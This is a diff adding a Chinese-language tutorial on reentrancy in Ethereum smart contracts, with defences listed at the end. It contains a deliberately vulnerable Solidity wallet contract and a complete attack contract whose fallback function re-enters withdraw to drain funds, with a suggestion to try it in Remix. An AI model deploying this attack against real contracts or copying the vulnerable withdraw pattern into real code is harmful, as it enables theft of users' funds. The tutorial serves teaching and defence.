@@ -1,0 +1,91 @@
+# <center>以太坊智能合约安全入门(一)</center>  
+------------------------
+一、 以太坊智能合约简介  
+Solidity是一种静态类型的大括号编程语言，用于开发在以太坊虚拟机上运行的智能合约。 智能合约是在对等网络内执行的程序，其中没有人对执行具有特殊权限，因此它们允许实现价值，所有权，投票和其他类型逻辑的令牌。
+
+部署合同时，您应该使用最新发布的Solidity版本。 这是因为定期引入重大更改以及新功能和错误修复。 我们目前使用0.x版本号来表示这种快速变化的步伐。  
+二、智能合约安全入门之重入漏洞   
+智能合约典型的操作是控制以太币流转，经常会调用智能合约发送以太币给各种各样的外部用户地址。调用外部合约或者发送以太币给一个地址的操作需要智能合约提交一个回调。这些外部调用能被攻击者劫持，他们借此强制智能合约执行额外的代码（例如通过回调函数），包括调用函数再次回到原先的智能合约。因此代码执行会“重入”智能合约，声名狼藉的DAO入侵就是借此漏洞，这也是再2018年中出现次数最多的漏洞种类。  
+下面的代码是存在一定的安全性问题的。
+```solidity
+pragma solidity ^0.4.10;
+
+contract IDMoney {
+    address owner;
+    mapping (address => uint256) balances;  // 记录每个打币者存入的资产情况
+
+    event withdrawLog(address, uint256);
+    
+    function IDMoney() { owner = msg.sender; }
+    function deposit() payable { balances[msg.sender] += msg.value; }
+    function withdraw(address to, uint256 amount) {
+        require(balances[msg.sender] > amount);
+        require(this.balance > amount);
+
+        withdrawLog(to, amount);  // 打印日志，方便观察 reentrancy
+        
+        to.call.value(amount)();  // 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部
+        balances[msg.sender] -= amount;
+    }
+    function balanceOf() returns (uint256) { return balances[msg.sender]; }
+    function balanceOf(address addr) returns (uint256) { return balances[addr]; }
+}
+ ```
+编写此代码是为了说明重入漏洞的原则并实施类似于公共钱包的合约。任何人都可以将相应的以太币存入IDMoney。合同将记录合同中每个帐户的帐户。该帐户可以在本合约中检查自身/其他人的余额，也可以在合同中使用以太币直接提取并转移到其他帐户。
+
+当初次了解以太坊智能合约的人分析上述代码时，他们应该认为这是一个相对正常的代码逻辑。似乎没有问题。以太坊智能合约漏洞的出现与其自身的语法（语言）特征有很大关系。这里，我们把焦点放在 withdraw(address, uint256) 函数中，合约在进行提币时，使用 require 依次判断提币账户是否拥有相应的资产和该合约是否拥有足够的资金可供提币（有点类似于交易所的提币判断），随后使用 to.call.value(amount)(); 来发送 Ether，处理完成后相应修改用户资产数据。
+
+当合约将以太币发送到未知地址时，可能会发生此攻击。攻击者可以在外部地址小心地构建合约，该地址包含回退函数中的恶意代码。因此，当合约把以太币发送到此地址时，将激活恶意代码。通常，恶意代码在易受攻击的合约上执行函数，是开发人员没有预期的操作。
+
+“Re-entrancy”的名称来自这样的现实：外部恶意合约回调了受攻击合约上的一个函数，并在受攻击合约上的任意位置“重新进入”代码执行。因为原合约的程序员可能没有预料到合约代码可以被“重入”，因此合约会出现不可预知的行为。
+
+具体的攻击合约实现如下，可以在remix中进行操作尝试实现。
+```solidity
+contract Attack {
+    address owner;
+    address victim;
+
+    modifier ownerOnly { require(owner == msg.sender); _; }
+    
+    function Attack() payable { owner = msg.sender; }
+    
+    // 设置已部署的 IDMoney 合约实例地址
+    function setVictim(address target) ownerOnly { victim = target; }
+    
+    // deposit Ether to IDMoney deployed
+    function step1(uint256 amount) ownerOnly payable {
+        if (this.balance > amount) {
+            victim.call.value(amount)(bytes4(keccak256("deposit()")));
+        }
+    }
+    // withdraw Ether from IDMoney deployed
+    function step2(uint256 amount) ownerOnly {
+        victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, amount);
+    }
+    // selfdestruct, send all balance to owner
+    function stopAttack() ownerOnly {
+        selfdestruct(owner);
+    }
+
+    function startAttack(uint256 amount) ownerOnly {
+        step1(amount);
+        step2(amount / 2);
+    }
+
+    function () payable {
+        if (msg.sender == victim) {
+            // 再次尝试调用 IDCoin 的 sendCoin 函数，递归转币
+            victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, msg.value);
+        }
+    }
+}
+```
+
+
+三、安全防护
+防止重入漏洞的措施：  
+第一种技术是（在可能的情况下）将 ether 发送到外部合约时使用内置的 transfer() 函数。transfer() 函数仅发送 2300 Gas 给外部调用，这不足以使目的地址合约调用另一个合约（即重入原合约）。
+
+第二种，是确保所有改变状态变量的逻辑，都发生在以太币被发送出合约（或任何外部调用）之前。
+
+第三种是引入互斥锁。也就是说，添加一个状态变量，在代码执行期间锁定合约，防止重入调用。
